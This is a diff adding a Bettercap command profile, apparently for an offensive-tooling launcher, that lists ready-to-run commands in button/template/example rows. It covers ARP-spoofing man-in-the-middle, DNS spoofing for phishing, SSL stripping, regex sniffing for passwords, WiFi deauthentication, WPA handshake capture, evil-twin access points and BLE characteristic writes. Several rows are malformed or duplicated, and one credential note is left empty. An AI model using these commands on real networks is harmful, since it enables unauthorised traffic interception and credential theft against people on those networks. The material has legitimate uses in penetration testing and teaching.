@@ -1,0 +1,125 @@
+# Profile: Bettercap (OffensiveRamen)
+# Source: OffensiveRamen
+# Format: Switch / Button Name | Command Template | Description
+
+
+# === INSTALLATION ===
+Kali/Debian | sudo apt install bettercap | sudo apt install bettercap
+macOS | brew install bettercap | brew install bettercap
+Go | go install <domain_name>/bettercap/bettercap@latest | go install github.com/bettercap/bettercap@latest
+Start | sudo bettercap | sudo bettercap
+Start Specific interface | sudo bettercap -iface <interface> | sudo bettercap -iface eth0
+Start Run caplet | sudo bettercap -caplet script.cap | sudo bettercap -caplet script.cap
+
+# === NETWORK DISCOVERY ===
+Active host discovery | net.probe on | net.probe on
+Show discovered hosts | net.show | net.show
+Passive recon | net.recon on | net.recon on
+Clear host list | net.clear | net.clear
+Target specific hosts | set arp.spoof.targets <target_ip> | set arp.spoof.targets 10.10.10.5
+set arp.spoof.targets 10.10.10.5,10.10.10.6 | set arp.spoof.targets <target_ip>,<target_ip> | set arp.spoof.targets 10.10.10.5,10.10.10.6
+
+# === ARP SPOOFING (MITM) ===
+Full duplex (both directions) | set arp.spoof.fullduplex true | set arp.spoof.fullduplex true
+Full duplex (both directions) Victim IP | set arp.spoof.targets <target_ip> | set arp.spoof.targets 10.10.10.5
+arp.spoof on | arp.spoof on | arp.spoof on
+Spoof entire subnet | set arp.spoof.targets <subnet_cidr> | set arp.spoof.targets 10.10.10.0/24
+set arp.spoof.fullduplex true | set arp.spoof.fullduplex true | set arp.spoof.fullduplex true
+arp.spoof on | arp.spoof on | arp.spoof on
+Spoof with internal forwarding Intercept LAN-to-LAN | set arp.spoof.internal true | set arp.spoof.internal true
+arp.spoof on | arp.spoof on | arp.spoof on
+
+# === DNS SPOOFING ===
+set dns.spoof.domains example.com | set dns.spoof.domains <domain_name> | set dns.spoof.domains example.com
+Redirect to this IP | set dns.spoof.address <target_ip> | set dns.spoof.address 10.10.10.100
+Spoof all domains | set dns.spoof.all true | set dns.spoof.all true
+dns.spoof on | dns.spoof on | dns.spoof on
+Multiple domains | set dns.spoof.domains <domain_name>,<domain_name>,*.<domain_name> | set dns.spoof.domains example.com,login.example.com,*.target.com
+
+# === HTTP/HTTPS PROXY ===
+HTTP proxy (intercept cleartext) SSL strip | set http.proxy.sslstrip true | set http.proxy.sslstrip true
+http.proxy on | http.proxy on | http.proxy on
+HTTPS proxy (requires CA cert) | set https.proxy.sslstrip true | set https.proxy.sslstrip true
+https.proxy on | https.proxy on | https.proxy on
+Custom proxy script (JavaScript) | set http.proxy.script /path/to/script.js | set http.proxy.script /path/to/script.js
+http.proxy on | http.proxy on | http.proxy on
+SSL strip | set net.sniff.verbose true | set net.sniff.verbose true
+set arp.spoof.targets 10.10.10.5 | set arp.spoof.targets <target_ip> | set arp.spoof.targets 10.10.10.5
+arp.spoof on | arp.spoof on | arp.spoof on
+http.proxy on | http.proxy on | http.proxy on
+net.sniff on | net.sniff on | net.sniff on
+
+# === SNIFFING ===
+Start sniffer | net.sniff on | net.sniff on
+Verbose output | set net.sniff.verbose true | set net.sniff.verbose true
+Save to file | set net.sniff.output <output_pcap> | set net.sniff.output capture.pcap
+BPF filter | set net.sniff.filter "tcp port 80" | set net.sniff.filter "tcp port 80"
+Regex filter | set net.sniff.regexp "password|login|user" | set net.sniff.regexp "password|login|user"
+Stop | net.sniff off | net.sniff off
+
+# === CREDENTIAL SNIFFING ===
+Automatic credential extraction | set net.sniff.verbose true | set net.sniff.verbose true
+net.sniff on | net.sniff on | net.sniff on
+
+# === WIFI ATTACKS ===
+Set interface to monitor mode first | sudo bettercap -iface <monitor_interface> | sudo bettercap -iface wlan0mon
+WiFi recon Scan for APs | wifi.recon on | wifi.recon on
+WiFi recon Show discovered APs | wifi.show | wifi.show
+WiFi recon Specific channels | wifi.recon.channel 1,6,11 | wifi.recon.channel 1,6,11
+Deauthentication Deauth all clients | wifi.deauth <ap_bssid> | wifi.deauth AP_BSSID
+Deauthentication Deauth specific client | wifi.deauth <client_mac> | wifi.deauth CLIENT_MAC
+WPA handshake capture | set wifi.handshakes.file handshakes/ | set wifi.handshakes.file handshakes/
+wifi.recon on | wifi.recon on | wifi.recon on
+WPA handshake capture Force reconnection | wifi.deauth <ap_bssid> | wifi.deauth AP_BSSID
+Evil twin Start rogue AP | wifi.ap on | wifi.ap on
+
+# === BLE (BLUETOOTH LOW ENERGY) ===
+Scan BLE devices | ble.recon on | ble.recon on
+Show discovered devices | ble.show | ble.show
+Enumerate services | ble.enum <device_mac> | ble.enum DEVICE_MAC
+Write to characteristic | ble.write <device_mac> <uuid> <data> | ble.write DEVICE_MAC UUID DATA
+
+# === CAPLETS (SCRIPTS) ===
+Run caplet Web UI | sudo bettercap -caplet http-ui | sudo bettercap -caplet http-ui
+Run caplet HTTPS Web UI | sudo bettercap -caplet https-ui | sudo bettercap -caplet https-ui
+Run caplet ARP spoof + sniff | sudo bettercap -caplet pita | sudo bettercap -caplet pita
+set arp.spoof.fullduplex true | set arp.spoof.fullduplex true | set arp.spoof.fullduplex true
+set arp.spoof.targets 10.10.10.5 | set arp.spoof.targets <target_ip> | set arp.spoof.targets 10.10.10.5
+set net.sniff.verbose true | set net.sniff.verbose true | set net.sniff.verbose true
+set net.sniff.output /tmp/capture.pcap | set net.sniff.output /tmp/<output_pcap> | set net.sniff.output /tmp/capture.pcap
+net.probe on | net.probe on | net.probe on
+arp.spoof on | arp.spoof on | arp.spoof on
+net.sniff on | net.sniff on | net.sniff on
+http.proxy on | http.proxy on | http.proxy on
+
+# === WEB UI ===
+Start with web interface | sudo bettercap -caplet https-ui | sudo bettercap -caplet https-ui
+Or manually | set api.rest.address <target_ip> | set api.rest.address 0.0.0.0
+set api.rest.port 8083 | set api.rest.port 8083 | set api.rest.port 8083
+set api.rest.username admin | set api.rest.username admin | set api.rest.username admin
+set api.rest.password password | set api.rest.password password | set api.rest.password password
+api.rest on | api.rest on | api.rest on
+
+# === PROXY SCRIPTS (JAVASCRIPT) ===
+Inject content into HTTP responses | set http.proxy.script caplets/Inject_content_into_HTTP_responses.js | set http.proxy.script caplets/Inject_content_into_HTTP_responses.js
+Log POST data | set http.proxy.script caplets/Log_POST_data.js | set http.proxy.script caplets/Log_POST_data.js
+
+# === COMMON ATTACK WORKFLOWS ===
+MITM + credential capture | sudo bettercap -caplet caplets/MITM_credential_capture.cap | sudo bettercap -caplet caplets/MITM_credential_capture.cap
+DNS spoofing + phishing | sudo bettercap -caplet caplets/DNS_spoofing_phishing.cap | sudo bettercap -caplet caplets/DNS_spoofing_phishing.cap
+SSL stripping | sudo bettercap -caplet caplets/SSL_stripping.cap | sudo bettercap -caplet caplets/SSL_stripping.cap
+WiFi handshake capture | sudo bettercap -caplet caplets/WiFi_handshake_capture.cap | sudo bettercap -caplet caplets/WiFi_handshake_capture.cap
+
+# === REFERENCE & TIPS ===
+# • [CREDENTIAL SNIFFING] Captures credentials from:
+# • [CAPLETS (SCRIPTS)] Custom caplet example (mitm.cap):
+# • [TIPS] Use fullduplex for reliable MITM
+# • [TIPS] Caplets automate complex attack chains
+# • [TIPS] Web UI provides visual network map
+# • [TIPS] WiFi attacks require monitor mode interface
+# • [TIPS] net.probe actively discovers all hosts on subnet
+# • [TIPS] Proxy scripts enable real-time traffic manipulation
+# • [TIPS] BLE recon useful for IoT pentesting
+# • [TIPS] HSTS prevents SSL stripping on modern sites
+# • [TIPS] Save captures for offline analysis in Wireshark
+# • [TIPS] Run net.probe before arp.spoof for target discovery
